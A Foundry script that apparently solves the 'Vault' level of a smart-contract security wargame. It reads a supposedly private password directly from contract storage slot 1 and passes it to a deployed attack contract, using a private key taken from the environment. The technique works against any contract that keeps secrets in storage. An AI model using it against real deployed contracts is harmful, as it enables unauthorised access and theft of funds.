// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/attacks/level08/Attack.sol";


contract VaultScript is Script {
    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address targetAddr = 0xaAB747C4D457419e4eFF4c9aaf12204c7953a763;

        vm.startBroadcast(privateKey);

        // password 的位置在第二个，所以读取 slot 1
        //storage slot 的类型要求是：bytes32
        bytes32 password = vm.load(targetAddr, bytes32(uint256(1)));

        VaultAttack attacker = new VaultAttack(targetAddr);
        attacker.attack(password);

        vm.stopBroadcast();
    }
}